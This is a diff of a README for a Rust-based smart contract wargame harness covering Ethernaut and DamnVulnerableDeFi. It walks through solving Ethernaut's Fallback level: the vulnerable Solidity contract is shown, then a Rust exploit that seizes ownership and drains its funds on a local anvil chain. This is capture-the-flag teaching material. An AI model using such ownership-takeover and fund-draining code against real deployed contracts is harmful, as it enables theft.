@@ -1,13 +1,13 @@
 # DEX OFFENDER
 
-A compilation of smart contract wargames (currently only Ethernaut and DamnVulnerableDeFi). You can find the levels in `./contracts/$GAME_NAME` and add your solution to `./solutions/src/$GAME_NAME/lvl*.rs`.
+A compilation of smart contract wargames (currently only Ethernaut and DamnVulnerableDeFi). You can find the levels in `./contracts/$GAME_NAME` and add your solution to `./attack/src/$GAME_NAME/hack*.rs`.
 
 ## Smart contracts
 
-Initialize `git` submodules to pull in `forge` depdendencies
+Install smart contract dependencies
 
 ```sh
-git submodule update --init --recursive
+forge install
 ```
 
 To build contracts and generate Rust bindings use
@@ -24,9 +24,14 @@ forge build -w
 
 You can find the full list of `forge` commands by running `forge help` and you can get all the options of a command by passing `--help`, e.g. `forge bind --help`.
 
+## Templates
+
+- `./ctf/src/ethernaut/template_lvl.rs`
+- `./attack/src/ethernaut/template_hack.rs`
+
 ## Example solution
 
-Let's solve the first level of Ethernaut, Fallback. You can find the source code of the contract in `./contracts/ethernaut/lvl1/Fallback.sol`.
+Let's solve the first level of Ethernaut, Fallback. You can find the source code of the contract in `./contracts/ethernaut/lvl01/Fallback.sol`.
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -69,34 +74,31 @@ contract Fallback {
 }
 ```
 
-To take ownership of the contract and withdraw the funds we need to first contribute less than `0.001` ether, then send any non-zero amount to the contract, and then simply call `withdraw`. Here's what it looks like in Rust (you find this code in `./solutions/src/ethernaut/lvl1_fallback.rs`).
+To take ownership of the contract and withdraw the funds we need to first contribute less than `0.001` ether, then send any non-zero amount to the contract, and then simply call `withdraw`. Here's what it looks like in Rust (you find this code in `./attack/src/ethernaut/hack01_fallback.rs`).
 
 ```rust
-use async_trait::async_trait; // <-- we need this for one line, don't worry bout it
-use ethers::prelude::*; // <----- this is the library that lets us interact with
-//                                  Ethereum in a convenient way
+use async_trait::async_trait;
+use ctf::ethernaut::lvl01_fallback::*;
+use ethers::prelude::*;
 
-use bindings::fallback::Fallback; // Rust bindings for the smart contract for the level
-
-struct Solution; // <-- Create an empty struct representing the level so
-//                       that you have something to implement the ctf::Solution trait for
+pub(crate) struct Exploit;
 
 #[async_trait]
-impl ctf::Solution for Solution {
-    type Level = ctf::ethernaut::Level1; // If you press ctrl+] then VS Code will take you to the
-//                                   definition of this type so you can check what you can
-//                                   use to pass the level. Usually it's just the address
-//                                   to which the target contract was deployed
+impl ctf::Exploit for Exploit {
+    type Target = Target; // If you press ctrl+] then VS Code will take you to the
+//                           definition of this type so you can check what you can
+//                           use to pass the level. Usually it's just the address
+//                           to which the target contract was deployed
 
-    async fn solve(
+    async fn attack(
         self,
-        challenge: &Self::Level, // this that same type you see in the `type Level` thing
+        target: &Self::Target, // this that same type you see in the `type Level` thing
         offender: &ctf::Actor, // <-- that's you. of course don't use the `deployer` account
     ) -> eyre::Result<()> {
         // This is how you "connect" to a deployed contract. You can see how it was deployed
-        // in ./ctf/src/ethernaut/lvl1_fallback.rs
+        // in ./ctf/src/ethernaut/lvl01_fallback.rs
         let contract =
-            Fallback::new(challenge.contract_address, offender.clone());
+            Fallback::new(target.contract_address, offender.clone());
 
         // This is how you call a contract function with no arguments:
         contract.contribute().value(1).send().await?.await?;
@@ -118,34 +120,16 @@ impl ctf::Solution for Solution {
 }
 ```
 
-If you then run `cargo test -p solutions -- --nocapture` you should see something like this
+If you then run `cargo test -p attack -- --nocapture` you should see something like this
 
-``` sh
-$ cargo test -p solutions -- --nocapture
-   Compiling solutions v0.1.0 (/home/gleb/code/0xgleb/data-cartel/dex-offender/solutions)
+``` text
+$ cargo test -p attack -- --nocapture
+   Compiling attack v0.1.0 (/home/gleb/code/0xgleb/data-cartel/dex-offender/attack)
     Finished test [unoptimized + debuginfo] target(s) in 6.83s
-     Running unittests src/lib.rs (target/debug/deps/solutions-2b00d561556c247a)
+     Running unittests src/lib.rs (target/debug/deps/attack-2b00d561556c247a)
 
 running 1 tests
 
-Ethernaut
-    Level 1: Fallback
-
-    Look carefully at the contract's code below.
-
-    You will beat this challenge if
-    1. you claim ownership of the contract
-    2. you reduce its balance to 0
-
-    Things that might help:
-    - How to send ether when interacting with an ABI
-    - How to send ether outside of the ABI
-    - Converting to and from wei/ether units (see help() command)
-    - Fallback methods
-
-Initializing accounts...
-Setting up the challenge...
-Deploying the Fallback contract...
 Running the solution...
 Checking the solution...
 Checking that you claimed ownership of the contract...
@@ -162,11 +146,11 @@ passedthelevelyoupassedthelevelyoupas
 sedthelevelyoupassedthelevelyoupassed
 -------------------------------------
 
-test ethernaut::lvl1_fallback::tests::test ... ok
+test ethernaut::hack01_fallback::tests::test ... ok
 
 test result: ok. 1 passed; 0 failed; 3 ignored; 0 measured; 0 filtered out; finished in 35.05s
 
-   Doc-tests solutions
+   Doc-tests attack
 
 running 0 tests
 
@@ -175,13 +159,11 @@ test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; fini
 
 ## Local blockchain
 
-If you're using the dev container then you already have a local blockchain running in one of the VS code terminals. If not, you can start it by running
+If you're using the dev container then you already have a local blockchain running in one of the VS code terminals. If not, you can start it by running `anvil`. I would recommend turning on tracing to make debugging easier.
 
 ``` sh
 anvil --steps-tracing --load-state state.json
 ```
-
-`--steps-tracing` turns on tracing in the build-in Geth client. This is useful for debugging. `--load-state` loads the state from the file specified. `state.json` contains the state of the blockchain with all the levels set up.
 
 | Field             | Value                                                       |
 | ----------------- | ----------------------------------------------------------- |
@@ -198,7 +180,7 @@ anvil --steps-tracing --load-state state.json
 | Deployer  | 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 | 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 |
 | Some user | 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 | 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d |
 
-## Command line wallet - Cast
+## Command line wallet
 
 You can then use `cast` to inspect blocks, transactions, send transactions, call smart contracts and more. Let's do Ethernaut level 1 again but now using `cast`. I deployed the `Fallback` contract behind the scenes to address `0x5FbDB2315678afecb367f032d93F642f64180aa3`. Let's call `contribute()` on the contract the same way we did in Rust. `-i` enables interactive mode and we can simply copy-paste the offender's private key to sign the transaction.
 
